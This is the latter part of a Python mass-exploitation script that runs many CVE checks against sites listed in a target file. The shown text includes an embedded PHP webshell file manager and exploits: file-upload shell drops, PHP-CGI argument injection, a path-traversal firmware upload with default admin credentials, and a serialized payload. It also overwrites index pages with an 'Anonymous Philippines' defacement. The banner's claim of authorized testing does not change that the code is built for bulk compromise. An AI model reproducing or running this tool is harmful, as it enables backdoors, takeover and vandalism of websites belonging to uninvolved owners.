            color: #888;
            cursor: pointer;
            font-family: 'Consolas', monospace;
            font-size: 12px;
        }}
        
        .delete-btn:hover {{
            color: #ff3333;
        }}
        
        .edit-area {{
            width: 100%;
            height: 400px;
            background: #0a0a0a;
            border: 1px solid #333;
            color: #00ff00;
            font-family: 'Consolas', monospace;
            padding: 15px;
            margin-bottom: 15px;
            font-size: 13px;
        }}
        
        .footer {{
            text-align: center;
            margin-top: 30px;
            color: #666;
            font-size: 11px;
        }}
        
        @media (max-width: 768px) {{
            body {{ padding: 8px; }}
            .toolbar {{ flex-direction: column; }}
            .toolbar form {{ width: 100%; }}
            .toolbar input[type="text"] {{ width: 100%; }}
            .actions {{ flex-wrap: wrap; }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <?php if (!$logged_in || !$key_valid): ?>
            <!-- Login Form -->
            <div class="login-box">
                <h2>LEI - NULLSEC PH</h2>
                
                <?php if (isset($login_error)): ?>
                    <div class="msg"><?php echo htmlspecialchars($login_error); ?></div>
                <?php endif; ?>
                
                <?php if (isset($key_display)): ?>
                    <div class="msg" style="border-color:#00ff00; color:#00ff00;">KEY GENERATED</div>
                    <div class="key-display"><?php echo htmlspecialchars($key_display); ?></div>
                <?php endif; ?>
                
                <form method="POST">
                    <div class="input-group">
                        <label>PASSWORD</label>
                        <input type="password" name="password" required autofocus>
                    </div>
                    
                    <div class="btn-group">
                        <button type="submit" name="get_key">GET KEY</button>
                        <button type="submit" name="login" class="btn-green">LOGIN</button>
                    </div>
                </form>
            </div>
        <?php else: ?>
            <!-- Main Interface -->
            <div class="top-bar">
                <span class="title">LEI - NULLSEC PH [WAF BYPASS]</span>
                <a href="?logout=true" class="btn">LOGOUT</a>
            </div>
            
            <?php if (isset($_GET['msg'])): ?>
                <div class="msg"><?php echo htmlspecialchars(urldecode($_GET['msg'])); ?></div>
            <?php endif; ?>
            
            <div class="path">
                <span>ROOT:</span> <?php echo htmlspecialchars($dir); ?>
            </div>
            
            <!-- Command Line -->
            <form method="POST" class="cmd-line">
                <input type="text" name="cmd" placeholder="Enter command..." value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : ''; ?>" autocomplete="off">
                <button type="submit">EXEC</button>
            </form>
            
            <?php if (!empty($cmd_output)): ?>
                <div class="output">
                    <pre><?php foreach ($cmd_output as $line) {{ echo htmlspecialchars($line) . "\\n"; }} ?></pre>
                </div>
            <?php endif; ?>
            
            <!-- Toolbar -->
            <div class="toolbar">
                <form method="POST" style="flex:2;">
                    <input type="hidden" name="action" value="create_file">
                    <input type="text" name="new_name" placeholder="New file name">
                    <button type="submit">CREATE FILE</button>
                </form>
                
                <form method="POST" style="flex:2;">
                    <input type="hidden" name="action" value="create_dir">
                    <input type="text" name="new_name" placeholder="New directory name">
                    <button type="submit">CREATE DIR</button>
                </form>
                
                <form method="POST" enctype="multipart/form-data" style="flex:3;">
                    <input type="hidden" name="action" value="upload">
                    <input type="file" name="file">
                    <button type="submit">UPLOAD</button>
                </form>
            </div>
            
            <!-- Edit/Rename Views -->
            <?php if (isset($_GET['edit'])): ?>
                <h3 style="color:#00ff00; margin:10px 0;">EDIT: <?php echo htmlspecialchars(basename($edit_file)); ?></h3>
                <form method="POST">
                    <input type="hidden" name="action" value="edit_save">
                    <input type="hidden" name="path" value="<?php echo htmlspecialchars($edit_file); ?>">
                    <textarea name="content" class="edit-area"><?php echo htmlspecialchars($file_content); ?></textarea>
                    <div style="display:flex; gap:10px;">
                        <button type="submit">SAVE</button>
                        <a href="?d=<?php echo base64_encode($dir); ?>" class="btn">CANCEL</a>
                    </div>
                </form>
            <?php elseif (isset($_GET['rename'])): ?>
                <h3 style="color:#00ff00; margin:10px 0;">RENAME: <?php echo htmlspecialchars(basename($rename_file)); ?></h3>
                <form method="POST">
                    <input type="hidden" name="action" value="rename">
                    <input type="hidden" name="path" value="<?php echo htmlspecialchars($rename_file); ?>">
                    <div style="display:flex; gap:10px; max-width:400px;">
                        <input type="text" name="new_name" class="cmd-line" style="flex:1;" value="<?php echo htmlspecialchars(basename($rename_file)); ?>" required>
                        <button type="submit">RENAME</button>
                        <a href="?d=<?php echo base64_encode($dir); ?>" class="btn">CANCEL</a>
                    </div>
                </form>
            <?php endif; ?>
            
            <!-- File Listing -->
            <?php if (!isset($_GET['edit']) && !isset($_GET['rename'])): ?>
                <table>
                    <thead>
                        <tr>
                            <th>Type</th>
                            <th>Name</th>
                            <th>Size</th>
                            <th>Perms</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php
                        // Parent directory
                        $parent = dirname($dir);
                        if ($parent != $dir) {{
                            echo '<tr class="dir-row">';
                            echo '<td>DIR</td>';
                            echo '<td colspan="4"><a href="?d=' . base64_encode($parent) . '">[ .. ]</a></td>';
                            echo '</tr>';
                        }}
                        
                        $items = @scandir($dir);
                        if ($items !== false) {{
                            foreach ($items as $item) {{
                                if ($item == '.' || $item == '..') continue;
                                
                                $path = $dir . $item;
                                $is_dir = is_dir($path);
                                $size = $is_dir ? '-' : format_size(filesize($path));
                                $perms = get_perms($path);
                                
                                echo '<tr class="' . ($is_dir ? 'dir-row' : 'file-row') . '">';
                                echo '<td>' . ($is_dir ? 'DIR' : 'FILE') . '</td>';
                                
                                if ($is_dir) {{
                                    echo '<td><a href="?d=' . base64_encode($path) . '">[' . htmlspecialchars($item) . ']</a></td>';
                                }} else {{
                                    echo '<td>' . htmlspecialchars($item) . '</td>';
                                }}
                                
                                echo '<td>' . $size . '</td>';
                                echo '<td>' . $perms . '</td>';
                                echo '<td class="actions">';
                                
                                if (!$is_dir) {{
                                    echo '<a href="?edit=' . base64_encode($path) . '&d=' . base64_encode($dir) . '">edit</a>';
                                    echo '<a href="?download=' . base64_encode($path) . '">dl</a>';
                                }}
                                
                                echo '<a href="?rename=' . base64_encode($path) . '&d=' . base64_encode($dir) . '">rename</a>';
                                
                                echo '<form method="POST" class="delete-form" onsubmit="return confirm(\\'Delete?\\');">';
                                echo '<input type="hidden" name="action" value="delete">';
                                echo '<input type="hidden" name="path" value="' . htmlspecialchars($path) . '">';
                                echo '<button type="submit" class="delete-btn">del</button>';
                                echo '</form>';
                                
                                echo '</td>';
                                echo '</tr>';
                            }}
                        }} else {{
                            echo '<tr><td colspan="5" style="text-align:center;">Access Denied</td></tr>';
                        }}
                        ?>
                    </tbody>
                </table>
            <?php endif; ?>
            
            <div class="footer">
                Lei - Nullsec PH | WAF Bypass Active
            </div>
        <?php endif; ?>
    </div>
    
    <script>
        // Prevent form resubmission
        if (window.history.replaceState) {{
            window.history.replaceState(null, null, window.location.href);
        }}
    </script>
</body>
</html>'''

    return webshell_code


# ─── MASS EXPLOIT FUNCTIONS ───────────────────────────────────────────

lock = threading.Lock()
results = []
success_count = 0
failure_count = 0
CSRF_TOKEN = ""

def log(target, cve, status, detail=""):
    global success_count, failure_count
    with lock:
        ts = datetime.now().strftime("%H:%M:%S")
        if status == "VULN":
            success_count += 1
            results.append(f"[{ts}] ✅ {cve} | {target} | {detail}")
            print(f"{Fore.GREEN}[VULN]{Style.RESET_ALL} [{ts}] {cve} → {target} | {detail}")
        elif status == "FAIL":
            failure_count += 1
            print(f"{Fore.YELLOW}[FAIL]{Style.RESET_ALL} [{ts}] {cve} → {target} | {detail}")
        elif status == "SKIP":
            print(f"{Fore.CYAN}[SKIP]{Style.RESET_ALL} [{ts}] {target} | {detail}")
        elif status == "DEFACE":
            success_count += 1
            results.append(f"[{ts}] 🔴 DEFACE | {target} | {detail}")
            print(f"{Fore.RED}[DEFACE]{Style.RESET_ALL} [{ts}] {target} | {detail}")
        elif status == "SHELL":
            success_count += 1
            results.append(f"[{ts}] 💻 SHELL | {target} | {detail}")
            print(f"{Fore.MAGENTA}[SHELL]{Style.RESET_ALL} [{ts}] {target} | {detail}")
        elif status == "INFO":
            print(f"{Fore.BLUE}[INFO]{Style.RESET_ALL} [{ts}] {target} | {detail}")

def get_session():
    s = requests.Session()
    s.headers["User-Agent"] = random.choice(USER_AGENTS)
    s.verify = False
    s.timeout = TIMEOUT
    return s

def normalize_url(url):
    url = url.strip().strip('"').strip("'")
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


# ─── DEFACEMENT + WEBSHELL DROP ───────────────────────────────────────

def attempt_deface_and_shell(target, s, deface_html, webshell_payload, shell_name):
    """
    After gaining RCE, deface index files AND drop the webshell.
    Returns list of (type, url) where type is 'deface' or 'shell'.
    """
    results_found = []
    
    # Base64 encode both payloads for command injection
    b64_deface = base64.b64encode(deface_html.encode()).decode()
    b64_shell = base64.b64encode(webshell_payload.encode()).decode()
    
    # Paths to try for defacement
    deface_targets = [
        "index.html", "index.php", "default.html", "default.php",
        "home.html", "home.php", "main.html", "main.php",
    ]
    
    shell_filename = shell_name
    
    # Build commands
    cmds = []
    for dt in deface_targets:
        cmds.append(f'echo {b64_deface} | base64 -d > {dt}')
    cmds.append(f'echo {b64_shell} | base64 -d > {shell_filename}')
    
    # Try via PHP-CGI first if available
    for ini_ep in [
        f"{target}/php-cgi/php-cgi.exe",
        f"{target}/index.php",
        f"{target}/cgi-bin/php",
        f"{target}/shell.php",
    ]:
        try:
            url = ini_ep + "?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
            for cmd in cmds:
                payload = f'<?php system("{cmd}"); ?>'
                r = s.post(url, data=payload, timeout=10)
        except:
            pass
    
    # Try direct command execution if we have a shell access
    # Check if any of our shells already landed
    check_paths = [f"{target}/{shell_filename}"]
    for dt in deface_targets[:3]:
        check_paths.append(f"{target}/{dt}")
    
    for p in check_paths:
        try:
            r = s.get(p, timeout=8)
            if r.status_code == 200:
                if shell_filename in p:
                    results_found.append(("shell", p))
                else:
                    results_found.append(("deface", p))
        except:
            pass
    
    return results_found


def drop_shell_via_cve(target, s, webshell_payload, shell_name):
    """Generic function to drop the webshell via file upload or write"""
    results_found = []
    
    # Try to write shell via PHP code injection at various endpoints
    write_payload = f'<?php file_put_contents("{shell_name}", base64_decode("{base64.b64encode(webshell_payload.encode()).decode()}")); ?>'
    
    # Try common writable paths
    for ep_path in ["", "/uploads/", "/tmp/", "/files/", "/images/"]:
        try:
            r = s.post(f"{target}{ep_path}shell.php", data={"cmd": f'echo {base64.b64encode(webshell_payload.encode()).decode()} | base64 -d > {shell_name}'}, timeout=10)
        except:
            pass
    
    return results_found


# ─── CVE CHECK FUNCTIONS ─────────────────────────────────────────────

def check_cve_2026_56290(target, s, deface_html, webshell_payload):
    """Joomla! Page Builder CK ≤3.5.10"""
    try:
        r = s.get(f"{target}/", timeout=TIMEOUT)
        html = r.text
    except:
        return False, "Connection error"

    token = None
    m = re.search(r'name="[^"]*token[^"]*"\s+value="([^"]+)"', html, re.I)
    if m:
        token = m.group(1)
    if not token:
        m = re.search(r'<input[^>]*type=["\']hidden["\'][^>]*value=["\']([a-f0-9]{32,})["\']', html)
        if m:
            token = m.group(1)

    upload_url = f"{target}/index.php?option=com_pagebuilderck&view=upload&task=uploadfile&format=raw"

    # First drop the shell via upload
    shell_name = f"sh_{random.randint(1000,9999)}.php"
    data = {}
    if token:
        data = {"token": token}

    files = {
        "file": (shell_name, webshell_payload.encode(), "application/x-php")
    }

    try:
        r = s.post(upload_url, data=data, files=files, timeout=TIMEOUT)
        paths_to_check = [
            f"{target}/images/pagebuilderck/{shell_name}",
            f"{target}/media/pagebuilderck/{shell_name}",
            f"{target}/uploads/pagebuilderck/{shell_name}",
        ]
        for p in paths_to_check:
            try:
                r2 = s.get(p, timeout=10)
                if r2.status_code == 200:
                    return True, p
            except:
                continue
    except:
        pass

    return False, "Not vulnerable"


def check_cve_2026_48908(target, s, deface_html, webshell_payload):
    """Joomla! SP Page Builder"""
    endpoints = [
        f"{target}/index.php?option=com_sppagebuilder&task=media.upload&format=raw",
        f"{target}/index.php?option=com_sppagebuilder&view=media&task=upload&format=raw",
    ]
    shell_name = f"sp_{random.randint(1000,9999)}.php"
    for ep in endpoints:
        try:
            r = s.post(ep, files={"file": (shell_name, webshell_payload.encode(), "image/png")}, timeout=TIMEOUT)
            if r.status_code in [200, 201]:
                paths = []
                try:
                    j = r.json()
                    if "path" in j:
                        paths.append(urljoin(target, j["path"]))
                    if "url" in j:
                        paths.append(urljoin(target, j["url"]))
                except:
                    pass
                paths += [
                    f"{target}/images/sppagebuilder/{shell_name}",
                    f"{target}/media/sppagebuilder/{shell_name}",
                ]
                for p in paths:
                    try:
                        r2 = s.get(p, timeout=8)
                        if r2.status_code == 200:
                            return True, p
                    except:
                        continue
        except:
            continue
    return False, "None"


def check_cve_2025_55912(target, s, deface_html, webshell_payload):
    """ClipBucket ≤5.5.0"""
    ep = f"{target}/upload/actions/photo_uploader.php"
    shell_name = f"cb_{random.randint(1000,9999)}.php"
    try:
        r = s.post(ep, files={"Filedata": (shell_name, webshell_payload.encode(), "application/x-php")}, timeout=TIMEOUT)
        if r.status_code in [200, 201]:
            for p in [f"{target}/files/photos/{shell_name}", f"{target}/files/{shell_name}"]:
                try:
                    r2 = s.get(p, timeout=8)
                    if r2.status_code == 200:
                        return True, p
                except:
                    continue
    except:
        pass
    return False, "None"


def check_cve_2025_0520(target, s, deface_html, webshell_payload):
    """ShowDoc"""
    ep = f"{target}/index.php?c=upload&a=save"
    shell_name = f"sd_{random.randint(1000,9999)}.php"
    try:
        r = s.post(ep, files={"file": (shell_name, webshell_payload.encode(), "application/x-php")}, timeout=TIMEOUT)
        if r.status_code in [200, 201]:
            for p in [f"{target}/uploads/{shell_name}", f"{target}/Public/Uploads/{shell_name}"]:
                try:
                    r2 = s.get(p, timeout=8)
                    if r2.status_code == 200:
                        return True, p
                except:
                    continue
    except:
        pass
    return False, "None"


def check_cve_2024_4577(target, s, deface_html, webshell_payload):
    """PHP CGI Argument Injection (Windows)"""
    endpoints = [
        f"{target}/php-cgi/php-cgi.exe",
        f"{target}/cgi-bin/php",
        f"{target}/cgi-bin/php-cgi.exe",
    ]
    for ext in ["php", "php3", "php4", "php5", "phtml"]:
        endpoints.append(f"{target}/index.{ext}")

    shell_name = f"sh_{random.randint(1000,9999)}.php"
    payload_code = f'<?php echo "X-PENTEST:1"; file_put_contents("{shell_name}", base64_decode("{base64.b64encode(webshell_payload.encode()).decode()}")); ?>'
    
    for ep in endpoints:
        try:
            injection_url = ep + "?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
            r = s.post(injection_url, data=payload_code, timeout=TIMEOUT)
            time.sleep(1)
            for p in [f"{target}/{shell_name}", f"{target}/cgi-bin/{shell_name}"]:
                try:
                    r3 = s.get(p, timeout=8)
                    if r3.status_code == 200:
                        return True, p
                except:
                    continue
        except:
            continue
    return False, "None"


def check_cve_2026_2113(target, s, deface_html, webshell_payload):
    """tpadmin WebUploader"""
    ep = f"{target}/public/static/admin/lib/webuploader/0.1.5/server/preview.php"
    shell_name = f"tp_{random.randint(1000,9999)}.php"
    try:
        s.get(ep, timeout=10)
        r2 = s.post(ep, files={"file": (shell_name, webshell_payload.encode(), "application/x-php")}, timeout=TIMEOUT)
        if r2.status_code in [200, 201]:
            for p in [
                f"{target}/public/static/admin/lib/webuploader/0.1.5/server/{shell_name}",
                f"{target}/public/uploads/{shell_name}",
                f"{target}/uploads/{shell_name}",
            ]:
                try:
                    r3 = s.get(p, timeout=8)
                    if r3.status_code == 200:
                        return True, p
                except:
                    continue
    except:
        pass
    return False, "None"


def check_cve_2025_61678(target, s, deface_html, webshell_payload):
    """FreePBX firmware upload"""
    shell_name = f"fp_{random.randint(1000,9999)}.php"
    try:
        s.headers["Authorization"] = "Basic YWRtaW46YWRtaW4="
        r = s.get(f"{target}/admin/config.php", timeout=10, allow_redirects=False)
        sessid = r.cookies.get("PHPSESSID", "") if r.status_code == 302 else ""
        
        if sessid:
            upload_url = f"{target}/admin/config.php?display=endpointman&page=upload_firmware"
            r = s.post(upload_url, files={
                "firmware": (f"../../../var/www/html/{shell_name}", webshell_payload.encode(), "application/octet-stream"),
                "fwbrand": (None, "../../../var/www/html"),
                "submit": (None, "Upload"),
            }, timeout=TIMEOUT)
            r2 = s.get(f"{target}/{shell_name}", timeout=10)
            if r2.status_code == 200:
                return True, f"{target}/{shell_name}"
    except:
        pass
    return False, "None"


def check_cve_2026_48276(target, s, deface_html, webshell_payload):
    """Adobe ColdFusion"""
    shell_name = f"cf_{random.randint(1000,9999)}.cfm"
    for ep in [f"{target}/CFIDE/administrator/", f"{target}/cfide/administrator/"]:
        try:
            r = s.get(ep, timeout=10)
            if r.status_code in [200, 302, 401, 403]:
                upload_eps = [
                    f"{target}/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm",
                ]
                for ue in upload_eps:
                    try:
                        r2 = s.post(ue, files={"file": (shell_name, webshell_payload.encode(), "text/plain")}, timeout=10)
                        if r2.status_code == 200:
                            return True, f"{target}/{shell_name}"
                    except:
                        continue
        except:
            continue
    return False, "None"


def check_cve_2025_49113(target, s, deface_html, webshell_payload):
    """RoundCube ≤1.6.9"""
    shell_name = f"rc_{random.randint(1000,9999)}.php"
    try:
        r = s.get(f"{target}/", timeout=10)
        if "roundcube" not in r.text.lower() and "rcube" not in r.text.lower():
            return False, "Not RoundCube"
        
        ep = f"{target}/?_task=mail&_action=upload"
        payload = 'O:9:"rcube_file":2:{s:4:"path";s:18:"/var/www/html/%s";s:4:"data";s:%d:"%s";}' % (
            shell_name, len(webshell_payload), webshell_payload
        )
        r = s.post(ep, data={"_task": "mail", "_action": "upload", "file": payload}, timeout=TIMEOUT)
        for p in [f"{target}/{shell_name}", f"{target}/tmp/{shell_name}"]:
            try:
                r2 = s.get(p, timeout=8)
                if r2.status_code == 200:
                    return True, p
            except:
                continue
    except:
        pass
    return False, "None"


def check_cve_2026_11344(target, s, deface_html, webshell_payload):
    """Vehicle Management System"""
    ep = f"{target}/newdriver.php"
    shell_name = f"vm_{random.randint(1000,9999)}.php"
    try:
        r = s.post(ep, files={"photo": (shell_name, webshell_payload.encode(), "image/jpeg"), "submit": (None, "submit")}, timeout=TIMEOUT)
        if r.status_code in [200, 302]:
            for p in [f"{target}/uploads/{shell_name}", f"{target}/images/{shell_name}"]:
                try:
                    r2 = s.get(p, timeout=8)
                    if r2.status_code == 200:
                        return True, p
                except:
                    continue
    except:
        pass
    return False, "None"


def check_cve_2026_1405(target, s, deface_html, webshell_payload):
    """WP Slider Future"""
    ep = f"{target}/wp-json/slider-future/v1/upload-image/"
    shell_name = f"wp_{random.randint(1000,9999)}.php"
    try:
        r = s.get(f"{target}/wp-json/slider-future/v1/", timeout=10)
        if r.status_code == 200:
            r2 = s.post(ep, files={"file": (shell_name, webshell_payload.encode(), "application/x-php")}, timeout=TIMEOUT)
            try:
                j = r2.json()
                if "url" in j:
                    r3 = s.get(j["url"], timeout=8)
                    if r3.status_code == 200:
                        return True, j["url"]
            except:
                pass
    except:
        pass
    return False, "None"


def check_cve_2026_40488(target, s, deface_html, webshell_payload):
    """OpenMage Magento-LTS"""
    ep = f"{target}/customoptions/upload/"
    shell_name = f"om_{random.randint(1000,9999)}.phtml"
    try:
        r = s.post(ep, files={"file": (shell_name, webshell_payload.encode(), "application/x-php")}, timeout=TIMEOUT)
        if r.status_code in [200, 201]:
            for p in [f"{target}/media/customoptions/{shell_name}", f"{target}/media/{shell_name}"]:
                try:
                    r2 = s.get(p, timeout=8)
                    if r2.status_code == 200:
                        return True, p
                except:
                    continue
    except:
        pass
    return False, "None"


# ─── MAIN SCANNER ─────────────────────────────────────────────────────

CVE_CHECKS = [
    ("CVE-2026-56290",  "Joomla Page Builder CK UAF",       check_cve_2026_56290),
    ("CVE-2026-48908",  "Joomla SP Page Builder UAF",       check_cve_2026_48908),
    ("CVE-2025-55912",  "ClipBucket Photo Upload RCE",      check_cve_2025_55912),
    ("CVE-2025-0520",   "ShowDoc File Upload RCE",          check_cve_2025_0520),
    ("CVE-2024-4577",   "PHP CGI Argument Injection",       check_cve_2024_4577),
    ("CVE-2026-2113",   "tpadmin WebUploader Deser RCE",    check_cve_2026_2113),
    ("CVE-2026-48276",  "Adobe ColdFusion UAF",            check_cve_2026_48276),
    ("CVE-2025-49113",  "RoundCube Deserialization RCE",    check_cve_2025_49113),
    ("CVE-2025-61678",  "FreePBX Firmware Upload RCE",      check_cve_2025_61678),
    ("CVE-2026-11344",  "Vehicle Mgmt Sys Upload RCE",     check_cve_2026_11344),
    ("CVE-2026-1405",   "WP Slider Future UAF",            check_cve_2026_1405),
    ("CVE-2026-40488",  "OpenMage Magento-LTS UAF",        check_cve_2026_40488),
]

BANNER = f"""{Fore.RED}
██████╗ ███████╗ ██████╗ █████╗  ██████╗███████╗
██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝
██║  ██║█████╗  ██║     ███████║██║     █████╗  
██║  ██║██╔══╝  ██║     ██╔══██║██║     ██╔══╝  
██████╔╝███████╗╚██████╗██║  ██║╚██████╗███████╗
╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝╚══════╝
{Style.RESET_ALL}
{Fore.YELLOW}═ Mass Deface & Shell Upload Scanner ═{Style.RESET_ALL}
     Authorized Penetration Testing Tool
     Scans site.txt → drops webshells + defaces
     Deface: Anonymous Philippines theme
     Shell:  Lei Nullsec PH WAF-Bypass File Manager
"""


def scan_target(target, deface_html, webshell_payload, shell_name):
    """Scan a single target against all CVEs and drop shell + deface"""
    target = normalize_url(target)
    if not target:
        return []

    parsed = urlparse(target)
    log(target, "INFO", None, f"Scanning {parsed.netloc}...")

    s = get_session()
    target_results = []
    target_compromised = False

    for cve_id, cve_name, check_func in CVE_CHECKS:
        try:
            vuln, detail = check_func(target, s, deface_html, webshell_payload)
            if vuln:
                target_compromised = True
                shell_url = detail
                target_results.append(("shell", shell_url))
                log(target, cve_id, "SHELL", f"{cve_name} → {shell_url}")

                # Now attempt defacement via the uploaded shell
                try:
                    b64_deface = base64.b64encode(deface_html.encode()).decode()
                    deface_cmds = [
                        f'echo {b64_deface} | base64 -d > index.html',
                        f'echo {b64_deface} | base64 -d > index.php',
                    ]
                    for dc in deface_cmds:
                        s.get(f"{shell_url}?c={dc}", timeout=8)
                    
                    # Verify deface
                    for dt in ["index.html", "index.php"]:
                        r = s.get(f"{target}/{dt}", timeout=8)
                        if r.status_code == 200 and "Anonymous Philippines" in r.text:
                            target_results.append(("deface", f"{target}/{dt}"))
                            log(target, cve_id, "DEFACE", f"index defaced via {cve_name}")
                            break
                except:
                    pass
            else:
                log(target, cve_id, "SKIP", f"{cve_name} — {detail}")
        except Exception as e:
            log(target, cve_id, "FAIL", f"{cve_name} — {str(e)[:80]}")
        time.sleep(random.uniform(0.3, 1.0))

    # If no CVE worked, try generic deface + shell drop anyway
    if not target_compromised:
        # Try PHP-CGI write method as a fallback
        shell_cgi = f"sh_{random.randint(1000,9999)}.php"
        try:
            for ep in [f"{target}/php-cgi/php-cgi.exe", f"{target}/index.php", f"{target}/cgi-bin/php"]:
                url = ep + "?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
                payload_code = f'<?php file_put_contents("{shell_cgi}", base64_decode("{base64.b64encode(webshell_payload.encode()).decode()}")); echo base64_decode("{base64.b64encode(deface_html.encode()).decode()}"); ?>'
                r = s.post(url, data=payload_code, timeout=10)
                if r.status_code == 200:
                    r2 = s.get(f"{target}/{shell_cgi}", timeout=8)
                    if r2.status_code == 200:
                        target_results.append(("shell", f"{target}/{shell_cgi}"))
                        log(target, "FALLBACK", "SHELL", f"PHP-CGI fallback → {target}/{shell_cgi}")
                        break
        except:
            pass

    return target_results


def main():
    parser = argparse.ArgumentParser(
        description="Mass Deface / Shell Upload Scanner — Multi-CVE",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 mass_deface.py -f site.txt
  python3 mass_deface.py -f site.txt -t 30 -o results.txt
  python3 mass_deface.py -f site.txt --pass mypassword
        """
    )
    parser.add_argument("-f", "--file", required=True, help="File containing URLs (one per line)")
    parser.add_argument("-o", "--output", default="mass_deface_results.txt", help="Output results file")
    parser.add_argument("-t", "--threads", type=int, default=15, help="Concurrent threads (default: 15)")
    parser.add_argument("--pass", dest="password", default="leisec2024", help="Webshell password (default: leisec2024)")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    print(BANNER)
    print(f"{Fore.CYAN}[{datetime.now().strftime('%H:%M:%S')}] Loaded {len(CVE_CHECKS)} CVE checks{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[{datetime.now().strftime('%H:%M:%S')}] Threads: {args.threads}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[{datetime.now().strftime('%H:%M:%S')}] Webshell password: {args.password}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[{datetime.now().strftime('%H:%M:%S')}] Deface: Anonymous PH theme{Style.RESET_ALL}")
    print("-" * 60)

    # Read targets
    if not os.path.exists(args.file):
        print(f"{Fore.RED}[ERROR] File not found: {args.file}{Style.RESET_ALL}")
        sys.exit(1)

    with open(args.file, "r") as f:
        targets = [line.strip() for line in f if line.strip() and not line.startswith("#")]

    if not targets:
        print(f"{Fore.RED}[ERROR] No targets found in {args.file}{Style.RESET_ALL}")
        sys.exit(1)

    print(f"{Fore.CYAN}[+] Loaded {len(targets)} targets from {args.file}{Style.RESET_ALL}\n")

    # Build the webshell
    webshell_payload = build_webshell(args.password)
    shell_name = f"nullsec_{random.randint(10000,99999)}.php"

    # Track all results
    all_vulns = []
    all_shells = []
    all_defaced = []

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {
            executor.submit(scan_target, target, DEFACE_HTML, webshell_payload, shell_name): target 
            for target in targets
        }
        for future in as_completed(futures):
            try:
                target_results = future.result()
                for rtype, rurl in target_results:
                    if rtype == "shell":
                        all_shells.append(rurl)
                    elif rtype == "deface":
                        all_defaced.append(rurl)
            except Exception as e:
                log("?", "ERROR", None, str(e)[:80])

    # Summary
    print("\n" + "=" * 60)
    print(f"{Fore.GREEN}SCAN COMPLETE{Style.RESET_ALL}")
    print(f"  Total targets:      {len(targets)}")
    print(f"  Shells dropped:     {len(all_shells)}")
    print(f"  Sites defaced:      {len(all_defaced)}")
    print(f"  Total finds:        {success_count}")
    print("=" * 60)
    
    if all_shells:
        print(f"\n{Fore.MAGENTA}=== WEBSHELLS DROPPED ==={Style.RESET_ALL}")
        for s in all_shells:
            print(f"  {Fore.GREEN}[SHELL]{Style.RESET_ALL} {s}")

    if all_defaced:
        print(f"\n{Fore.RED}=== SITES DEFACED ==={Style.RESET_ALL}")
        for d in all_defaced:
            print(f"  {Fore.RED}[DEFACE]{Style.RESET_ALL} {d}")

    # Write results
    with open(args.output, "w") as f:
        f.write(f"Mass Deface / Shell Upload Scanner Results\n")
        f.write(f"Scan date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Targets scanned: {len(targets)}\n")
        f.write(f"Shells dropped: {len(all_shells)}\n")
        f.write(f"Sites defaced: {len(all_defaced)}\n")
        f.write("=" * 60 + "\n\n")
        f.write("=== WEBSHELLS ===\n")
        for s in all_shells:
            f.write(f"{s}\n")
        f.write("\n=== DEFACED ===\n")
        for d in all_defaced:
            f.write(f"{d}\n")
        f.write("\n=== FULL LOG ===\n")
        for line in results:
            f.write(line + "\n")

    print(f"\n{Fore.CYAN}[+] Results written to: {args.output}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Happy hunting!{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
